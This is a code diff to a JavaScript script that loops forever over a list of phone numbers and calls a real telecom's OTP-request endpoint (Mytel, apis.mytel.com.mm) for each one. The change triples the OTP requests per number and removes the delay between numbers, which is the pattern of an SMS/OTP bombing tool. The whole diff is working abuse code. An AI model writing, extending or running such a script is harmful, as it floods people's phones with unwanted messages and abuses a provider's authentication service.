@@ -20,16 +20,18 @@ async function fetchPhones() {
 }
 
 async function sendOtp(phone) {
-    try {
-        const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
-        const res = await axios.get(url);
-        if (res.status === 200) {
-            console.log(`✅ Sent OTP to ${phone}`);
-        } else {
-            console.log(`⚠️ Failed for ${phone} - Status: ${res.status}`);
+    for (let i = 0; i < 3; i++) {
+        try {
+            const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
+            const res = await axios.get(url);
+            if (res.status === 200) {
+                console.log(`✅ (${i+1}/3) OTP sent to ${phone}`);
+            } else {
+                console.log(`⚠️ (${i+1}/3) Failed for ${phone} - Status: ${res.status}`);
+            }
+        } catch (e) {
+            console.error(`❌ (${i+1}/3) Error sending to ${phone}:`, e.message);
         }
-    } catch (e) {
-        console.error(`❌ Error sending to ${phone}:`, e.message);
     }
 }
 
@@ -43,12 +45,12 @@ async function loopOnce() {
             continue;
         }
 
-        await sendOtp(phone);
+        await sendOtp(phone); // Send 3 times
         count++;
-        await new Promise(r => setTimeout(r, 1000)); // 1s delay
+        // ❌ No delay between phones
     }
 
-    console.log(`✅ Round complete. Sent OTP to ${count} users.\n`);
+    console.log(`✅ Round complete. Sent OTP to ${count} users (x3 each).\n`);
 }
 
 async function loopForever() {
